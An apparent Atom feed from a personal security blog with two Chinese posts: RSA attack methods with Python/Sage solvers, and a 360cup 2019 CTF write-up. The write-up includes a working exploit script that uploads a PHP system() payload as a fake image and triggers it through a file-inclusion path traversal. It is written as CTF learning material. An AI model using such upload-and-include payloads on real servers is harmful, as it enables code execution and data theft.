<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcark</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lcark.github.io/"/>
  <updated>2019-11-08T16:27:06.625Z</updated>
  <id>https://lcark.github.io/</id>
  
  <author>
    <name>Lcark</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RSA 常见攻击方法</title>
    <link href="https://lcark.github.io/2019/11/09/RSA-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
    <id>https://lcark.github.io/2019/11/09/RSA-常见攻击方法/</id>
    <published>2019-11-08T16:18:00.000Z</published>
    <updated>2019-11-08T16:27:06.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1、共模攻击"><a href="#1、共模攻击" class="headerlink" title="1、共模攻击"></a>1、共模攻击</h1><h2 id="描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c"><a href="#描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c" class="headerlink" title="描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c"></a>描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c</h2><h2 id="python描述"><a href="#python描述" class="headerlink" title="python描述"></a>python描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> egcd <span class="keyword">import</span> egcd</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">32</span>)</span><br><span class="line">q = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e2 = getPrime(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="number">123456</span></span><br><span class="line">c1 = pow(m, e1, n)</span><br><span class="line">c2 = pow(m, e2, n)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>当<code>GCD(e1, e2) == 1</code>时，由扩展欧几里得算法可知必存在s1, s2使 <code>e1s1 + e2s2 = 1，m = pow(m, e1s1+e2s2, n)</code>，而<code>pow(m, e1s1+e2s2, n) = pow(m, e1s1, n) * pow(m, e2s2, n) = pow(c1, s1, n) * pow(c2, s2, n)</code></p><h2 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> egcd <span class="keyword">import</span> egcd</span><br><span class="line">_, s1, s2 = egcd(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    m = pow(inverse(c1, n), -s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    m = pow(c1, s1, n) * pow(inverse(c2, n), -s2, n) % n</span><br></pre></td></tr></table></figure><h1 id="2、低解密指数攻击"><a href="#2、低解密指数攻击" class="headerlink" title="2、低解密指数攻击"></a>2、低解密指数攻击</h1><h2 id="描述：解密密指数d过小"><a href="#描述：解密密指数d过小" class="headerlink" title="描述：解密密指数d过小"></a>描述：解密密指数d过小</h2><h2 id="pyhon-描述"><a href="#pyhon-描述" class="headerlink" title="pyhon 描述"></a>pyhon 描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="number">3</span></span><br><span class="line">e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">m = pow(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>详情见<a href="https://paper.seebug.org/727/" target="_blank" rel="noopener">Wiener</a></p><h2 id="python实现-1"><a href="#python实现-1" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> owiener</span><br><span class="line">e = <span class="number">3047442173541658754667464233797118324917469250436575767227172319344577259865313428705759330024959317716760816959590728238918140105663188172228696589411452947738069773833351725455888549656717874059636289036277785342126992626060696063089487811946920569580454880169977542532087635095357205433679009382368108273</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">135568509670260054049994954417860747085442883428459182441559553532993752593294067458983143521109377661295622146963670193783017382697726454953197805014428888491744355387957923382241961401063461549210355871385000347645387907568135032087942016502668629010859519249039662555733548461551175133582871220209515648241</span></span><br><span class="line"></span><br><span class="line">d = owiener.attack(e, n)</span><br><span class="line"></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h1 id="3、低加密指数攻击"><a href="#3、低加密指数攻击" class="headerlink" title="3、低加密指数攻击"></a>3、低加密指数攻击</h1><h2 id="3-1、明文较小"><a href="#3-1、明文较小" class="headerlink" title="3.1、明文较小"></a>3.1、明文较小</h2><h2 id="描述：e比较小，一般为3"><a href="#描述：e比较小，一般为3" class="headerlink" title="描述：e比较小，一般为3"></a>描述：e比较小，一般为3</h2><h2 id="pyhon-描述-1"><a href="#pyhon-描述-1" class="headerlink" title="pyhon 描述"></a>pyhon 描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">3</span></span><br><span class="line">c = pow(m, e, n)</span><br></pre></td></tr></table></figure><h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p><code>(m=c^d%n,n*x+m=c^d) =&gt; m=pow(n*x+c,1/e)</code>，当n比较小时，可以成功开方。</p><h2 id="python实现-2"><a href="#python实现-2" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smallEattack</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span> ** <span class="number">10</span>):</span><br><span class="line">            res = iroot(n * i + c, e)</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">1</span>]:</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="3-2-Hastad广播攻击"><a href="#3-2-Hastad广播攻击" class="headerlink" title="3.2 Hastad广播攻击"></a>3.2 Hastad广播攻击</h2><h2 id="描述：使用相同的加密指数-e-加密相同的信息，发送给多于e个不同的人，可能受到低加密指数广播攻击"><a href="#描述：使用相同的加密指数-e-加密相同的信息，发送给多于e个不同的人，可能受到低加密指数广播攻击" class="headerlink" title="描述：使用相同的加密指数 e 加密相同的信息，发送给多于e个不同的人，可能受到低加密指数广播攻击"></a>描述：使用相同的加密指数 e 加密相同的信息，发送给多于e个不同的人，可能受到低加密指数广播攻击</h2><h2 id="pyhon-描述-2"><a href="#pyhon-描述-2" class="headerlink" title="pyhon 描述"></a>pyhon 描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">3</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br></pre></td></tr></table></figure><h2 id="攻击原理-3"><a href="#攻击原理-3" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>考虑e=3，假设n1、n2、n3互素，否则可计算最大公约数直接得到p、q，由于n1、n2、n3互素，由中国剩余定理可求得<code>m^e</code></p><h2 id="python实现-3"><a href="#python实现-3" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> CRT <span class="keyword">import</span> chinese_remainder</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">datas = [(<span class="number">5</span>,<span class="number">92270627783020341903769877272635163757611737252302329401876135487358785338853904185572496782685853218459404423868889360808646192858060332110830962463986164014331540336037718684606223893506327126112739408023014900003600028654929488487584130630596342720833061628867179840913592694993869009133576053124769728363</span>,<span class="number">83421434286602546493364204139182949897795123160498680670964040331447569764445309937195566103281638928183742488663157138572020817924561990979723444797045375101801354862472761507421896454904818874439231990567738173059815647539737800523632262742398190575822391771655932895657208471832891505814792263361394479317</span>), (<span class="number">5</span>,<span class="number">102900163930497791064402577447949741195464555746599233552338455905339363524435647082637326033518083289523250670463907211548409422234391456982344516192210687545692054217151133151915216123275005464229534891629568864361154658107093228352829098251468904800809585061088484485542019575848774643260318502441084765867</span>,<span class="number">25585088950095290712328215701309273521406235982885781641137768116285362079062975527364909549362511146004390419156826709543326814581466248280564194951706937822088902607754944405407698735824315900942915322054614437632116732271787823814807624841386886185122143173564380877370643120953803688563589496390425159539</span>), (<span class="number">5</span>,<span class="number">90267480939368160749458049207367083180407266027531212674879245323647502822038591438536367206422215464489854541063867946215243190345476874546091188408120551902573113507876754578290674792643018845798263156849027209440979746485414654160320058352559498237296080490768064578067282805498131582552189186085941328701</span>,<span class="number">44374979291120575503988741531987454898919254880086464254904878064332010355432423956182135846738023874326776872139229379943321321362822522900479438294291206287205647145759972233097276253408812699557305314344220807356024994977399840843758750494467535572805794732065369887057841293267499209427585419962565568495</span>), (<span class="number">5</span>,<span class="number">90673177193017332602781813187879442725562909473411994052511479411887936365983777106776080722300002656952655125041151156684340743907349108729774157616323863062525593382279143395837261053976652138764279456528493914961780300269591722101449703932139132398288208673556967030162666354552157189525415838326249712949</span>,<span class="number">24086371701602948122317790211004032014326487279907486724991846810668564197542368948703436295770758262739732290677177527297040556666434577730354732397784651220918412407485171180732327730242552955646750279842251200227937257322414662213662054605527282812231172173474061845763736546747711105935349033514358348526</span>), (<span class="number">5</span>,<span class="number">90916739755838083837461026375700330885001446224187511395518230504776419813625940046511904838818660297497622072999229706061698225191645268591198600955240116302461331913178712722096591257619538927050886521512453691902946234986556913039431677697816965623861908091178749411071673467596883926097177996147858865293</span>,<span class="number">23204039098754030513954332212496652705175644349879686639449689791620605370809827884267260830136516742466455588549253481016504796674014871020503543639681251834114159250986728840380777774144853925216884802529230212783759821262799845229436535491711201551797166082529740271577684082458494926929260818927584104158</span>)]</span><br><span class="line">nList = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> datas]</span><br><span class="line">cList = [x[<span class="number">2</span>] <span class="keyword">for</span> x <span class="keyword">in</span> datas]</span><br><span class="line"></span><br><span class="line">print(len(datas))</span><br><span class="line">print(iroot(chinese_remainder(nList, cList), datas[<span class="number">0</span>][<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="3-3、copperSmith部分信息攻击"><a href="#3-3、copperSmith部分信息攻击" class="headerlink" title="3.3、copperSmith部分信息攻击"></a>3.3、copperSmith部分信息攻击</h2><h2 id="描述：已知部分明文"><a href="#描述：已知部分明文" class="headerlink" title="描述：已知部分明文"></a>描述：已知部分明文</h2><h2 id="python实现-4"><a href="#python实现-4" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0x9876543210abcdef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">smallE = [(<span class="number">5</span>,<span class="number">92270627783020341903769877272635163757611737252302329401876135487358785338853904185572496782685853218459404423868889360808646192858060332110830962463986164014331540336037718684606223893506327126112739408023014900003600028654929488487584130630596342720833061628867179840913592694993869009133576053124769728363</span>,<span class="number">83421434286602546493364204139182949897795123160498680670964040331447569764445309937195566103281638928183742488663157138572020817924561990979723444797045375101801354862472761507421896454904818874439231990567738173059815647539737800523632262742398190575822391771655932895657208471832891505814792263361394479317</span>), (<span class="number">3</span>,<span class="number">155266493936043103849855199987896813716831986416707080645036022909153373110367007140301635144950634879983289720164117794783088845393686109145443728632527874768524615377182297125716276153800765906014206797548230661764274997562670900115383324605843933035314110752560290540848152237316752573471110899212429555149</span>,<span class="number">124929943232081828105808318993257526364596580021564021377503915670544445679836588765369503919311404328043203272693851622132258819278328852726005776082575583793735570095307898828254568015886630010269615546857335790791577865565021730890364239443651479580968112031521485174068731577348690810906553798608040451024</span>), (<span class="number">5</span>,<span class="number">102900163930497791064402577447949741195464555746599233552338455905339363524435647082637326033518083289523250670463907211548409422234391456982344516192210687545692054217151133151915216123275005464229534891629568864361154658107093228352829098251468904800809585061088484485542019575848774643260318502441084765867</span>,<span class="number">25585088950095290712328215701309273521406235982885781641137768116285362079062975527364909549362511146004390419156826709543326814581466248280564194951706937822088902607754944405407698735824315900942915322054614437632116732271787823814807624841386886185122143173564380877370643120953803688563589496390425159539</span>), (<span class="number">3</span>,<span class="number">112306066601652819062206435724795595603085908011001671184332227488970057128128821831260649058569739569103298091727188365019228385820143813415009397359257831092635374404034997011441653286642458431865026213129412677064308342580757248577955071384972714557250468686599901682728173096745710849318629959223270431039</span>,<span class="number">108387832390337770947361518376552702503741092284778824448943971792044922720461955035726863109418657218498659460663504872870862538725835055240750735576735249122665348803252691221869146679004017916359067454693701495389784159620341860394035373599823801288442604273046729873467936004227013186659110262247417571857</span>), (<span class="number">5</span>,<span class="number">90267480939368160749458049207367083180407266027531212674879245323647502822038591438536367206422215464489854541063867946215243190345476874546091188408120551902573113507876754578290674792643018845798263156849027209440979746485414654160320058352559498237296080490768064578067282805498131582552189186085941328701</span>,<span class="number">44374979291120575503988741531987454898919254880086464254904878064332010355432423956182135846738023874326776872139229379943321321362822522900479438294291206287205647145759972233097276253408812699557305314344220807356024994977399840843758750494467535572805794732065369887057841293267499209427585419962565568495</span>), (<span class="number">3</span>,<span class="number">147733349387696521015664992396355145811249793103958464053225389476050097503928022819269482555955365534137156079172704297584033078453033637103720972881068435459202133846880715879894340131656691631756162323422868846616160423755883726450486845175227682329583615739797782025647376042249605775433971714513081755709</span>,<span class="number">52253817590056116368273294519761274350847193477090280916373828903718796358618956145225746496960677477661151583828604021049936963779103440560630451125137344639503705880024677345063113240530798352727432768980751992926293801206779839157443722614687126711272753610923903360818026083573711899014859313677159790039</span>), (<span class="number">5</span>,<span class="number">90673177193017332602781813187879442725562909473411994052511479411887936365983777106776080722300002656952655125041151156684340743907349108729774157616323863062525593382279143395837261053976652138764279456528493914961780300269591722101449703932139132398288208673556967030162666354552157189525415838326249712949</span>,<span class="number">24086371701602948122317790211004032014326487279907486724991846810668564197542368948703436295770758262739732290677177527297040556666434577730354732397784651220918412407485171180732327730242552955646750279842251200227937257322414662213662054605527282812231172173474061845763736546747711105935349033514358348526</span>),(<span class="number">5</span>,<span class="number">90916739755838083837461026375700330885001446224187511395518230504776419813625940046511904838818660297497622072999229706061698225191645268591198600955240116302461331913178712722096591257619538927050886521512453691902946234986556913039431677697816965623861908091178749411071673467596883926097177996147858865293</span>,<span class="number">23204039098754030513954332212496652705175644349879686639449689791620605370809827884267260830136516742466455588549253481016504796674014871020503543639681251834114159250986728840380777774144853925216884802529230212783759821262799845229436535491711201551797166082529740271577684082458494926929260818927584104158</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> smallE:</span><br><span class="line">    n = data[<span class="number">1</span>]</span><br><span class="line">    c = data[<span class="number">2</span>]</span><br><span class="line">    e = data[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = i + <span class="number">0x100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> * x</span><br><span class="line">            kbits=<span class="number">64</span></span><br><span class="line">            PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">            f = (x + b)^e-c</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"x: %s"</span> %hex(int(x0))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"m: %s"</span> %hex(int(b + x0))</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%x"</span> % e</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1、共模攻击&quot;&gt;&lt;a href=&quot;#1、共模攻击&quot; class=&quot;headerlink&quot; title=&quot;1、共模攻击&quot;&gt;&lt;/a&gt;1、共模攻击&lt;/h1&gt;&lt;h2 id=&quot;描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c&quot;&gt;&lt;a href=&quot;#描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c&quot; class=&quot;headerlink&quot; title=&quot;描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c&quot;&gt;&lt;/a&gt;描述：对同一明文m多次使用相同n，不同e加密，得到不同密文c&lt;/h2&gt;&lt;h2 id=&quot;python描述&quot;&gt;&lt;a href=&quot;#python描述&quot; class=&quot;headerlink&quot; title=&quot;python描述&quot;&gt;&lt;/a&gt;python描述&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; egcd &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; egcd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = getPrime(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;q = getPrime(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n = p * q&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e1 = getPrime(&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e2 = getPrime(&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;m = &lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c1 = pow(m, e1, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c2 = pow(m, e2, n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="cryptography" scheme="https://lcark.github.io/categories/cryptography/"/>
    
    
      <category term="RSA" scheme="https://lcark.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>360cup 2019 wp</title>
    <link href="https://lcark.github.io/2019/11/02/360cup-2019-wp/"/>
    <id>https://lcark.github.io/2019/11/02/360cup-2019-wp/</id>
    <published>2019-11-02T10:08:00.000Z</published>
    <updated>2019-11-08T16:28:48.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#53;&amp;#55;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#102;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#100;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#100;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#53;&amp;#52;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#102;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#53;&amp;#102;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#51;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#52;&amp;#51;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#37;&amp;#53;&amp;#67;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;"</span></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urldecode(html_entity_decode($encryptText));</span><br><span class="line">\u0057\u0065\u006c\u0063\u006f\u006d\u0065\u002d\u0054\u006f\u005f\u0033\u0043\u0074\u0066</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-8.png" alt="upload successful"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问<a href="http://examination.cup.360.cn:9004/.git" target="_blank" rel="noopener">http://examination.cup.360.cn:9004/.git</a> ，发现403，判断为git泄露，使用GitHack.py dump下来源码，发现文件包含漏洞，下面是利用代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post, get</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://examination.cup.360.cn:9002/upload.php"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">"face"</span>:(<span class="string">'test.jpg'</span>, <span class="string">b'&lt;?php echo system("cat 739d3f54_flag.php");'</span>)&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"37ed358aaf35c9508dfb1b715b3c01ab"</span>&#125;</span><br><span class="line"></span><br><span class="line">res = post(url, files=files, cookies=cookies)</span><br><span class="line">print(res.content)</span><br><span class="line">filename = res.content.decode(<span class="string">'utf-8'</span>)[<span class="number">-36</span>:]</span><br><span class="line">print(filename)</span><br><span class="line"></span><br><span class="line">path = <span class="string">'showimage.php?/../ac78b24a/'</span> + filename</span><br><span class="line">params = &#123;<span class="string">"file"</span>:path&#125;</span><br><span class="line">res = get(<span class="string">"http://examination.cup.360.cn:9002/include.php"</span>, params=params, cookies=cookies)</span><br><span class="line">print(res.content.decode())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到题&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#53;&amp;amp;#55;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#53;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#99;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#51;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#102;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#100;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#53;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#50;&amp;amp;#100;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#53;&amp;amp;#52;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#54;&amp;amp;#102;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#53;&amp;amp;#102;&amp;amp;#37;&amp;amp;#53;&amp;amp;#67;&amp;amp;#117;&amp;amp;#48;&amp;amp;#48;&amp;amp;#51;&amp;amp;#51;&amp;amp;#37;&amp;amp